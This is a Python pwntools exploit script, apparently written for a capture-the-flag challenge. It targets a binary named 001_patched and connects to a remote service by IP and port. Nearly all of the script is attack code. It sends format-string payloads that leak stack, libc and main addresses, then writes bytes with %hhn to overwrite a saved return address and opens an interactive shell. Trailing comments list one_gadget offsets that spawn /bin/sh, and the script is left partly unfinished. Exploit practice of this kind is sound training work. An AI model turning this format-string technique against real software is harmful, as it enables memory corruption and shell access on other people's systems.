#!/usr/bin/env python3

from pwn import *

exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.terminal = ['konsole', '-e']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        b* main +49
        c
        ''')

if args.REMOTE:
    conn = 'nc 14.225.212.104 9001'.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

pl = b''
pl += b'%p_'*0x10
pl += b'aaaa__%168$p%169$p%168$s%173$p\x00'

# sla(b'>', b'a')
sla(b'>', pl)
ru(b'aaaa__')
stack = int(r(14), 16)
print(f'here: {hex(stack)}')
libc.address = int(r(14), 16) - 0x2a1ca
print(f'libc base: {hex(libc.address)}')
test = u64(r(6) + b'\x00\x00')
print(f'here: {hex(test)}')
main = int(r(14), 16)
print(f'main: {hex(main)}')

tg = libc.sym['__environ']

one_gadget = libc.address + 0x1111da
info(f'one gadget: {hex(one_gadget)}')
a1 = main & 0xff
a2 = (main >> 16) & 0xffff
info(f'one gadget: {hex(a1)}')
info(f'one gadget: {hex(a2)}')

pl = b''
# pl = b'aaa%11$s\x00'
pl += f'%{a1}c%11$hhn'.encode()
# pl += f'%13$n%{a1}c%11$hhn%{a2 - a1}c%12$hn'.encode()
pl = pl.ljust(0x20, b'a')
pl += b'b'*8
pl += p64(stack - 0x5b8)
pl += p64(stack - 0x5b8 + 2)
pl += p64(stack - 0x5b8 + 4)
pl += p64(stack - 0x5b8)
# pl += p64(stack - 0x98)
# pl += p64(stack - 0x98 + 0x2)
# pl += p64(stack - 0x98)

sla(b'>', pl)
# ru(b'aaa')
# rc = u64(r(6) + b'\x00\x00')
# print(f'here 2: {hex(rc)}')

# 0x1111da
# info(f'printf {hex(libc.sym['printf'])}')
# info(f'fgets {hex(libc.sym['fgets'])}')
# info(f'scanf {hex(libc.sym['scanf'])}')
# info(f'gets {hex(libc.sym['gets'])}')
# info(f'__libc_start_main {hex(libc.sym['__libc_start_main'])}')

p.interactive()

# 0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
# kazuke@archlinux ~/ctf/002/vsl_ctf_2026/send2player$ 